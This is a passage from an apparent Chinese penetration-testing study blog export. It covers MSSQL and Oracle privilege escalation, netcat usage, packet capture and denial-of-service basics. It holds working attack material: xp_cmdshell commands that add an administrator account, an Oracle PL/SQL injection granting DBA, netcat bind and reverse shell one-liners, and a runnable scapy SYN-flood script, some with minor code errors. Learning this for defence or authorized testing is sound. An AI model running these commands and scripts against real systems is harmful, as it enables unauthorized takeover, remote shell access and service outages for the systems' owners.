<h5 id="关闭xp-cmdshell"><a href="#关闭xp-cmdshell" class="headerlink" title="关闭xp_cmdshell"></a>关闭xp_cmdshell</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'show advanced options'</span>, 1;reconfigure;</span><br><span class="line"><span class="built_in">exec</span> sp_configure <span class="string">'xp_cmdshell'</span>, 0;reconfigure</span><br></pre></td></tr></table></figure>

<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'net user test pinohd123. /add'</span>    添加用户<span class="built_in">test</span>，密码<span class="built_in">test</span></span><br><span class="line"><span class="built_in">exec</span> master..xp_cmdshell <span class="string">'net localgroup administrators test add'</span>    添加<span class="built_in">test</span>用户到管理员组</span><br></pre></td></tr></table></figure>

<h3 id="Oracle数据库提权之注入存储过程提权"><a href="#Oracle数据库提权之注入存储过程提权" class="headerlink" title="Oracle数据库提权之注入存储过程提权"></a>Oracle数据库提权之注入存储过程提权</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>SYS创建的存储过程存在sql注入。拥有<code>create procedure</code>权限的用户通过创建提权函数，将提权函数注入到存储过程中，于是该存储过程将调用这个提权函数来执行<code>grant dba to quan</code>命令，获得<strong>Oracle数据库dba权限</strong>。</p>
<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>SYS创建的存储过程<code>存在sql注入</code>（EG：CVE-2005-4832）</li>
<li>用户拥有<code>create procedure</code>权限（用来创建函数）</li>
</ul>
<h4 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h4><p>假设有一个用户quan 只有 CONNECT 和 RESOURCE 权限</p>
<h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><ul>
<li>用户登陆后执行<code>select * from session_privs</code>查看权限</li>
<li>创建函数，命令为<code>grant dba to quan</code></li>
</ul>
<p>grant execute on pwn to public;//赋予所有用户此函数的执行权限</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SQL</span>&gt;<span class="keyword">create</span> <span class="keyword">or replace</span> <span class="keyword">function</span> pwn <span class="keyword">return</span> vaarchar2</span><br><span class="line">authid <span class="built_in">current_user</span> <span class="keyword">is</span> pragma autonomous_transaction;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">execute</span> <span class="keyword">immediate</span> <span class="string">'grant dba to quan'</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line"><span class="keyword">SQL</span>&gt;<span class="keyword">grant</span> <span class="keyword">execute</span> <span class="keyword">on</span> pwn <span class="keyword">to</span> <span class="built_in">public</span>;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>

<p>注入sys.dbms_cdc_subscribe.activate_subscription</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SQL&gt;begin</span><br><span class="line">sys.dbms_cdc_subscribe.activate_subscription(<span class="string">'''||quan.pwn()||'''</span>);</span><br><span class="line">end;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">SQL&gt;set role dba;</span><br></pre></td></tr></table></figure>

<p>执行<code>select * from session_privs</code>查看是否为dba权限</p>
<h5 id="利用MSF注入"><a href="#利用MSF注入" class="headerlink" title="利用MSF注入"></a>利用MSF注入</h5><p>1.加载攻击模块</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> auxiliary/sqli/<span class="keyword">oracle</span>/dbms_cdc_subscribe.activate_subscription</span><br></pre></td></tr></table></figure>

<p>2.配置参数</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">set</span> dbuser quan</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> dbpass quan123</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> sid orcl</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> rhost xxxxx</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">set</span> sql grant dba <span class="keyword">to</span> quan</span><br></pre></td></tr></table></figure>

<p>3.run</p>
<h3 id="Oracle数据库提权之通过utl-http-request存储过程提权"><a href="#Oracle数据库提权之通过utl-http-request存储过程提权" class="headerlink" title="Oracle数据库提权之通过utl_http.request存储过程提权"></a>Oracle数据库提权之通过utl_http.request存储过程提权</h3><h4 id="原理分析-2"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h4><p>Oracle9i~11gR2中<code>dbms_xmlquery.newcontext()</code>和<code>dbms_xmlquery.getxml()</code>函数可以执行任意PL/SQL语句，利用这两个函数可以获得Oracle服务器的<strong>操作系统权限</strong>。</p>
<h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>UTL_HTTP存储过程可用</li>
<li>Oracle9i~11gR2</li>
</ul>
<h4 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h4><ol>
<li>创建Java包</li>
<li>创建存储过程MYJAVACMD</li>
<li>执行存储过程，成功添加用户</li>
</ol>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/0nc3/p/12081189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nc3/p/12081189.html</a></p>
<p><a href="https://www.webshell.cc/4790.html" target="_blank" rel="noopener">https://www.webshell.cc/4790.html</a></p>
<p><a href="https://xz.aliyun.com/t/2719" target="_blank" rel="noopener">https://xz.aliyun.com/t/2719</a></p>
<p><a href="https://blog.csdn.net/qq_26090065/article/details/81515355" target="_blank" rel="noopener">https://blog.csdn.net/qq_26090065/article/details/81515355</a></p>
<p><a href="https://xz.aliyun.com/t/7392#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7392#toc-10</a></p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试——基本工具</title>
    <url>/2020/03/12/shen-tou-ce-shi-ji-ben-gong-ju/</url>
    <content><![CDATA[<h3 id="渗透测试——基本工具"><a href="#渗透测试——基本工具" class="headerlink" title="渗透测试——基本工具"></a>渗透测试——基本工具</h3><h4 id="一、NETCAT（nc"><a href="#一、NETCAT（nc" class="headerlink" title="一、NETCAT（nc)"></a>一、NETCAT（nc)</h4><ul>
<li>网络工具中的瑞士军刀（小身材、大智慧）</li>
<li>侦听模式/传输模式</li>
<li>telent/获取banner信息</li>
<li>传输文本信息</li>
<li>传输文件/目录</li>
<li>加密传输文件</li>
<li>远程控制/木马</li>
<li>加密所有流量</li>
<li>流媒体服务器</li>
<li>远程克隆硬盘</li>
</ul>
<p><strong>NC（TELNET/BANNER功能）</strong></p>
<ul>
<li>nc -nv 1.1.1.1 110</li>
<li>nc -nv 1.1.1.1 25</li>
<li>nc -nv 1.1.1.1 80</li>
</ul>
<p>nc作为客户端时，可以对服务器端进行侦听</p>
<p><strong>示例：</strong></p>
<p>ping pop3.163.com  #查看163邮箱pop3的IP地址</p>
<p>nc -nv 123.125.50.29 110 #n只跟IP地址，不对DNS地址进行解析；v显示详细输出信息；参数后面跟                                                服务IP和端口</p>
<p>user   邮箱用户名（base64编码）   邮箱密码（base64编码）</p>
<p>通过以上命令可以在命令行下接受邮件。</p>
<h5 id="NC（传输文本信息）"><a href="#NC（传输文本信息）" class="headerlink" title="NC（传输文本信息）"></a><strong>NC（传输文本信息）</strong></h5><p><strong>示例</strong>：</p>
<p>服务器端：nc -l -p 3333  #-l 表示侦听 -p指定打开的端口号</p>
<p>​                   netstat -pantu | grep 3333 #查看3333端口是否打开</p>
<p>客户端： nc -nv 192.168.1.132 3333 #参数后面跟服务器的IP地址和开放的端口。</p>
<h5 id="NC（远程电子取证信息收集"><a href="#NC（远程电子取证信息收集" class="headerlink" title="NC（远程电子取证信息收集)"></a><strong>NC（远程电子取证信息收集)</strong></h5><p><strong>示例1：</strong></p>
<p>A对B当前目录信息进行取证</p>
<p>A：nc -l -p 3333 #-l表示侦听 -p指定打开的端口号 A对3333端口开始侦听</p>
<p>B：ls -l | nc -nv 192.168.153.132 3333 #将当前目录下的文件属性列表信息传递给A。</p>
<p><strong>示例2：</strong></p>
<p>A对B当前系统进程信息进行取证并存档</p>
<p>A:nc -l -p 3333&gt;ps.txt #侦听3333端口，并把侦听内容重定向到当前目录的1.txt文件里</p>
<p>B:ps aux | nc -nv 192.168.153.132 -q 1 #将当前系统进程信息进行取证并存档到1.txt中  -q表示自动                                                                        断开nc连接</p>
<p>A:cat ps.txt #查看ps.txt文件内容</p>
<p>远程电子取证信息收集尽量少的去对目标机器进行修改。</p>
<h5 id="NC（传输文件）"><a href="#NC（传输文件）" class="headerlink" title="NC（传输文件）"></a><strong>NC（传输文件）</strong></h5><p><strong>正向文件运输</strong></p>
<p>A：mc -l -p 3333&gt;1.mp4 #侦听端为文件接受端，接受对方3333端口发送的文件并命名为1.mp4</p>
<p>B：nc -nv 192.168.153.132 3333 &lt;1.mp4 -q 1 #文件发送端</p>
<p><strong>反向文件运输</strong></p>
<p>A: nc -lp 3333&lt; 1.mp4 -q 1 #侦听端为文件发送端，将1.mp4这个文件放在3333侦听端口上等待对方接收</p>
<p>B: nc -nv 192.168.0.5 3333&gt; 1.mp4  #文件接收端</p>
<h5 id="NC（传输目录）"><a href="#NC（传输目录）" class="headerlink" title="NC（传输目录）"></a><strong>NC（传输目录）</strong></h5><h5 id="NC（流媒体服务"><a href="#NC（流媒体服务" class="headerlink" title="NC（流媒体服务)"></a><strong>NC（流媒体服务)</strong></h5><p><strong>示例：</strong></p>
<p>A：cat 1.mp4 | nc -l -p 3333  #A端为流媒体输出端，将1.mp4这个文件打开并通过3333端口进行输                                                        出</p>
<p>B：nc -nv 192.168.153.130 | mplayer -vo x11 -cache 3000 #B端为流媒体客户端，将侦听A端3333                    端口，并通过mplayer媒体播放器进行播放，设定缓存为3000K</p>
<h5 id="NC（端口扫描）"><a href="#NC（端口扫描）" class="headerlink" title="NC（端口扫描）"></a><strong>NC（端口扫描）</strong></h5><p><strong>示例：</strong></p>
<p>nc -nvz 192.168.153.130 1-65535 #扫描目标主机TCP 1-65535开放的端口</p>
<p>nc -nvzu 192.168.153.130 1-65535 #扫描目标主机UDP 1-1024开放的端口</p>
<h5 id="NC（远程控制）"><a href="#NC（远程控制）" class="headerlink" title="NC（远程控制）"></a><strong>NC（远程控制）</strong></h5><p>服务器端开启远程控制：</p>
<p>服务器：nc -lp port -c bash#把shell交给过来连接的客户端</p>
<p>客户端：nc -nv ip port </p>
<p>客户端开启远程控制：</p>
<p>服务器端：nc -lp port</p>
<p>客户端：nc -nv IP port -c bash </p>
<p>window上将-c bash 改为-c cmd</p>
<p>注意事项：服务器防火墙一般会限制外网对内网的访问，但是内网对外网的访问限制可能被忽略。</p>
<p>​                    内网对外网的访问限制：将DNS服务器单独隔离出来，只开放53端口开放侦听外网，</p>
<p>​                    主动在客户端开启一个端口，并在服务器上侦听该端口，且把shell交给客户端。这种方式不容易被防火墙拦截。</p>
<h5 id="NC的缺陷"><a href="#NC的缺陷" class="headerlink" title="NC的缺陷"></a><strong>NC的缺陷</strong></h5><p>缺乏数据加密和身份认证的能力</p>
<h5 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a><strong>NCAT</strong></h5><p>nmap工具包中的ncat，设计用于弥补NC的缺陷。</p>
<p>nc版本太多，参数各不相同，使用起来有困难。</p>
<p>Ubantu版本没有-c，需要用临时文件去转换bash</p>
<p>遇到问题查看man命令手册（系统自带软件）</p>
<p>服务端开启端口：ncat -c bash –allow IP(指定可连接的客户端IP）-vnl port –ssl（防止嗅探者查看到明文信息）</p>
<p>客户端连接：ncat -nv IP port  –ssl    互相交换指纹是一对一连接，保证安全。</p>
<h4 id="二、WIRESHARK"><a href="#二、WIRESHARK" class="headerlink" title="二、WIRESHARK"></a>二、WIRESHARK</h4><p><strong>常用功能</strong></p>
<ul>
<li>抓包嗅探协议分析</li>
<li>抓包引擎</li>
<li>Libpcap9–Linux</li>
<li>winpcap10-windows</li>
</ul>
<p><strong>基本使用方法：</strong></p>
<p>1、终端输入wireshark，启动</p>
<p> 2、选择要抓包的网卡。</p>
<p> 3、打开捕获选项，勾选混杂模式（只抓捕本地信息（网卡绑定的ip地址信息），如果不选择捕获模式则无法获取广播（当前网络中的所有信息）信息）。</p>
<p>4、选择捕获过滤器,可以选择要抓包的内容，如ip地址 格式 host ip地址或者其他协议。</p>
<p> 5、停止抓包后保存内容，尽量使用pcap格式。兼容性较好。</p>
<p> 6、通过分析-显示过滤器对抓包结果进行过滤</p>
<p><strong>数据包的分层结构</strong></p>
<ul>
<li>Arp</li>
<li>lcmp</li>
<li>Tcp三次握手</li>
</ul>
<p>1.源向目标发送syn包（确认连接）</p>
<p>2.目标向源发送syn、ack（回应并向源确认）</p>
<p>3.源向目标发送ack包（回应目标发送的syn）</p>
<ul>
<li>Udp</li>
<li>Dns</li>
<li>http</li>
<li>ftp</li>
</ul>
<p><strong>数据流</strong></p>
<ul>
<li>TCP流</li>
<li>UDP流</li>
<li>SSL流</li>
<li>HTTP流</li>
</ul>
<h4 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h4><h5 id="tcpdump——抓包"><a href="#tcpdump——抓包" class="headerlink" title="tcpdump——抓包"></a>tcpdump——抓包</h5><p>​       wireshark是图形化工具，在服务器等没有图形化界面的设备上无法使用，此时tcpdump命令行工具可以代替</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">tcpdump -<span class="selector-tag">i</span> eth0 -s <span class="number">0</span> -w <span class="selector-tag">a</span>.cap/<span class="selector-tag">b</span>.pcap</span><br></pre></td></tr></table></figure>

<p>-i 指定抓包接口，-s 指定抓包大小，0为抓取整个包，不指定则默认抓取64字节。-w 将抓到的包保存到某个文件，不指定则实时显示</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">tcpdump -r a.<span class="built_in">cap</span>/b.<span class="built_in">cap</span></span><br></pre></td></tr></table></figure>

<p>-r read读取</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">tcpdump -A -r a.<span class="built_in">cap</span>/b.<span class="built_in">cap</span></span><br></pre></td></tr></table></figure>

<p>-A 使用ascii码表转码显示，不要加在-r后面，不然会报错 -X 使用16进制显示</p>
<h5 id="tcpdump——抓包筛选器"><a href="#tcpdump——抓包筛选器" class="headerlink" title="tcpdump——抓包筛选器"></a>tcpdump——抓包筛选器</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0<span class="built_in"> port </span>22</span><br></pre></td></tr></table></figure>

<p>抓以太网0上22端口的包。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 tcp<span class="built_in"> port </span>22</span><br></pre></td></tr></table></figure>

<p>抓以太网0上22端口的TCP包。 curl -v URL</p>
<h5 id="tcpdump——显示筛选器"><a href="#tcpdump——显示筛选器" class="headerlink" title="tcpdump——显示筛选器"></a>tcpdump——显示筛选器</h5><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">tcpdump -<span class="keyword">n</span> -r http.<span class="keyword">cap</span> | awk '&#123;<span class="keyword">print</span> <span class="variable">$3&#125;</span>' | <span class="keyword">sort</span> -<span class="keyword">u</span></span><br></pre></td></tr></table></figure>

<p>-n 不对IP进行域名解析  AWK 默认用空格做分割 -u unique去重</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">tcpdump -n src host<span class="built_in"> IP </span>-r file.cap/file.pcap</span><br></pre></td></tr></table></figure>

<p>src host IP 指定来源IP，src–&gt;source</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">tcpdump -n dst host<span class="built_in"> IP </span>-r file.cap/file.pcap</span><br></pre></td></tr></table></figure>

<p>dst destination，指定目标IP</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">tcpdump -n udp<span class="built_in"> port </span>53  -r file.cap/file.pcap</span><br></pre></td></tr></table></figure>

<p>udp 指定显示的协议  port 53 指定端口</p>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
  </entry>
  <entry>
    <title>渗透测试——拒绝服务</title>
    <url>/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/</url>
    <content><![CDATA[<h2 id="拒绝服务常见的攻击方式总结"><a href="#拒绝服务常见的攻击方式总结" class="headerlink" title="拒绝服务常见的攻击方式总结"></a>拒绝服务常见的攻击方式总结</h2><h4 id="1-拒绝服务简介"><a href="#1-拒绝服务简介" class="headerlink" title="1.拒绝服务简介"></a>1.拒绝服务简介</h4><ul>
<li>Dos不是Ddos<ul>
<li>利用程序漏洞或一对一资源耗尽的Denial of service拒绝服务</li>
</ul>
</li>
<li>DDos分布式拒绝服务<ul>
<li>一对一的攻击完全拼各自的资源，效果差。</li>
<li>多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型</li>
</ul>
</li>
<li>历史<ul>
<li>以前：欠缺技术能力的无赖，我ping死你</li>
<li>现在：最强大最危险的攻击，攻击方式众多<ul>
<li>贩卖和租用肉鸡已经成为黑产种重要的一部分</li>
<li>最终的办法就是拼资源，投资抗D，或者乖乖交保护费。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-DoS分类"><a href="#2-DoS分类" class="headerlink" title="2.DoS分类"></a>2.DoS分类</h4><ul>
<li>D网络<ul>
<li>基于巨量的Flood耗尽目标网络带宽资源</li>
<li>ICMP Flood、UDP Flood</li>
</ul>
</li>
<li>D协议<ul>
<li>攻击协议漏洞发起的拒绝服务攻击</li>
<li>如Syn Flood、Ping of Death、ARP、DNS、802.11、SSL </li>
</ul>
</li>
<li>D应用<ul>
<li>针对应用软件和操作系统漏洞发起的拒绝服务攻击</li>
<li>大量频繁访问消耗系统资源严重的应用（CC）</li>
<li>通常表现为操作系统运行正常，网络流量不大，但服务停止响应</li>
<li>可以是一击毙命的，也可以是耗尽目标资源的</li>
</ul>
</li>
</ul>
<h4 id="3-为何会被Dos"><a href="#3-为何会被Dos" class="headerlink" title="3.为何会被Dos"></a>3.为何会被Dos</h4><ul>
<li>从攻击者到被害者<ul>
<li>网络—&gt;FW（服务）—&gt;服务器OS—&gt;服务应用</li>
</ul>
</li>
<li>资源耗尽<ul>
<li>网络：带宽</li>
<li>FW:吞吐量、并发连接</li>
<li>服务器：CPU、内存、I/O</li>
<li>应用：处理请求能力，对OS资源的使用权</li>
</ul>
</li>
<li>程序漏洞攻击<ul>
<li>缓冲区溢出</li>
<li>协议、程序逻辑漏洞</li>
</ul>
</li>
<li>链路上任何一点都可成为目标</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/QQ%E6%88%AA%E5%9B%BE20200320111906.png" alt></p>
<h3 id="拒绝服务——Syn-Flood攻击"><a href="#拒绝服务——Syn-Flood攻击" class="headerlink" title="拒绝服务——Syn-Flood攻击"></a>拒绝服务——Syn-Flood攻击</h3><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>1.TCP连接和端口过程</p>
<p><strong>TCP建立连接</strong></p>
<p>第一次握手：建立连接时，客户端发送syn包（syn=j）到服务器，并进入SYN_SENT状态，等待服务器确认；SYN：同步序列编号（Synchronize Sequence Numbers）。</p>
<p>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；</p>
<p>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK(ack=k+1），此包发送完毕，客户端和服务器进入ESTABLISHED（TCP连接成功）状态，完成三次握手。</p>
<p>完成三次握手，客户端与服务器开始传送数据，在上述过程中，还有一些重要的概念：</p>
<p>未连接队列<br>在三次握手协议中，服务器维护一个未连接队列，该队列为每个客户端的SYN包（syn=j）开设一个条目，该条目表明服务器已收到SYN包，并向客户发出确认，正在等待客户的确认包。这些条目所标识的连接在服务器处于SYN_RECV状态，当服务器收到客户的确认包时，删除该条目，服务器进入ESTABLISHED状态。<br><strong>关闭TCP连接</strong></p>
<p>对于一个已经建立的连接，TCP使用改进的三次握手来释放连接（使用一个带有FIN附加标记的报文段）。TCP关闭连接的步骤如下：</p>
<p>第一步，当主机A的应用程序通知TCP数据已经发送完毕时，TCP向主机B发送一个带有FIN附加标记的报文段（FIN表示英文finish）。</p>
<p>第二步，主机B收到这个FIN报文段之后，并不立即用FIN报文段回复主机A，而是先向主机A发送一个确认序号ACK，同时通知自己相应的应用程序：对方要求关闭连接（先发送ACK的目的是为了防止在这段时间内，对方重传FIN报文段）。</p>
<p>第三步，主机B的应用程序告诉TCP：我要彻底的关闭连接，TCP向主机A送一个FIN报文段。</p>
<p>第四步，主机A收到这个FIN报文段后，向主机B发送一个ACK表示连接彻底释放。</p>
<p>2.TCP 连接状态</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/SW5S4jW.png" alt="img"></p>
<p>3.两个序号和三个标志位：</p>
<ul>
<li>序号：seq序号，占32位，用来标识从TCP源端向目的端发送的字节流，发起方发送数据时对此进行标记。</li>
<li>确认序号：ack序号，占32位，只有ACK标志位为1时，确认序号字段才有效，ack=seq+1。</li>
<li>标志位：共6个，即URG、ACK、PSH、RST、SYN、FIN等，具体含义如下：<ul>
<li>URG：紧急指针（urgent pointer）有效。</li>
<li>ACK：确认序号有效。</li>
<li>PSH：接收方应该尽快将这个报文交给应用层。</li>
<li>RST：重置连接。</li>
<li>SYN：发起一个新连接。</li>
<li>FIN：释放一个连接。</li>
</ul>
</li>
<li>需要注意的是：<ul>
<li>不要将确认序号ack与标志位中的ACK搞混了。</li>
<li>认方ack=发起方req+1，两端配对</li>
</ul>
</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/qoYhkJa.png" alt="img"><br>在第一次消息发送中，A随机选取一个序列号作为自己的初始序号发送给B；第二次消息B使用ack对A的数据包进行确认，</p>
<p>因为已经收到了序列号为x的数据包，准备接收序列号为x+1的包，所以ack=x+1，同时B告诉A自己的初始序列号，就是seq=y；</p>
<p>第三条消息A告诉B收到了B的确认消息并准备建立连接，A自己此条消息的序列号是x+1，所以seq=x+1，而ack=y+1是表示A正准备接收B序列号为y+1的数据包。</p>
<p><strong>4.四次挥手</strong></p>
<ul>
<li>由于TCP连接时全双工的，因此，每个方向都必须要单独进行关闭，这一原则是当一方完成数据发送任务后，发送一个FIN来终止这一方向的连接，</li>
<li>收到一个FIN只是意味着这一方向上没有数据流动了，即不会再收到数据了，但是在这个TCP连接上仍然能够发送数据，直到这一方向也发送了FIN</li>
<li>首先进行关闭的一方将执行主动关闭，而另一方则执行被动关闭，上图描述的即是如此。<ul>
<li>第一次挥手：Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态</li>
<li>第二次挥手：Server收到FIN后，发送一个ACK给Client，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。</li>
<li>第三次挥手：Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。</li>
<li>第四次挥手：Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。</li>
</ul>
</li>
</ul>
<h4 id="1-scapy构造数据包"><a href="#1-scapy构造数据包" class="headerlink" title="1.scapy构造数据包"></a>1.scapy构造数据包</h4><h5 id="1-构造-IP-数据包"><a href="#1-构造-IP-数据包" class="headerlink" title="1. 构造 IP 数据包"></a><strong>1. 构造 IP 数据包</strong></h5><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i=IP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/E3mSTtG.png" alt="img"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.dst=<span class="string">"10.10.10.132"</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; i.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/KO66HGs.png" alt="img"></p>
<h5 id="2-构造TCP数据包"><a href="#2-构造TCP数据包" class="headerlink" title="2.构造TCP数据包"></a>2.构造TCP数据包</h5><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; t=TCP()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; t.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/DCJyqt6.png" alt="img"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; t.dport=<span class="number">22</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; t.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/y3zVkjb.png" alt="img"></p>
<h5 id="3-发送数据包需要构造成-IP-TCP-形式：i-t"><a href="#3-发送数据包需要构造成-IP-TCP-形式：i-t" class="headerlink" title="3. 发送数据包需要构造成 IP()/TCP() 形式：i/t"></a><strong>3. 发送数据包需要构造成 IP()/TCP() 形式：i/t</strong></h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; sr1(i/t,verbose=<span class="number">1</span>,timeout=<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/WNZ7i9P.png" alt="img"></p>
<h5 id="4-由于重建连接请求时会向服务器发送-reset-数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则："><a href="#4-由于重建连接请求时会向服务器发送-reset-数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则：" class="headerlink" title="4.由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则："></a><strong>4.由于重建连接请求时会向服务器发送 reset 数据包重置连接请求，达不到攻击效果，则可以在本地设置防火墙规则：</strong></h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp --tcp-flags RST RST -d <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span> -j DROP</span><br><span class="line"></span><br><span class="line">iptables -A OUTPUT -p tcp --tcp-flags RST RST -d <span class="number">10.10</span><span class="number">.10</span><span class="number">.141</span> -j DROP</span><br></pre></td></tr></table></figure>

<h3 id="2-脚本攻击"><a href="#2-脚本攻击" class="headerlink" title="2. 脚本攻击"></a>2. 脚本攻击</h3><h4 id="脚本攻击-linux-服务器"><a href="#脚本攻击-linux-服务器" class="headerlink" title="脚本攻击 linux 服务器"></a>脚本攻击 linux 服务器</h4><p>1.脚本内容</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all import*</span><br><span class="line"><span class="keyword">from</span> time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != 4:</span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"用法: ./syn_flood.py [IP地址] [端口] [线程数]"</span></span><br><span class="line">    <span class="builtin-name">print</span> <span class="string">"举例: ../syn_flood.py  1.1.1.1 80 20"</span></span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">port= int(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">print<span class="string">"正在执行 SYN flood 攻击，按 Ctrl+C 停止攻击。"</span></span><br><span class="line">def synflood(target,port):</span><br><span class="line">    <span class="keyword">while</span> 1:</span><br><span class="line">        x = random.randint(0,65535)</span><br><span class="line">        send(IP(<span class="attribute">dst</span>=target)/TCP(dport=port,sport=x),verbose=0)</span><br><span class="line">        sr1(i/t,<span class="attribute">verbose</span>=1,timeout=2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(0,threads):</span><br><span class="line">    thread.start_new_thread(synflood,(target,port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> 1:</span><br><span class="line">  sleep(1)</span><br></pre></td></tr></table></figure>

<p>2.执行脚本</p>
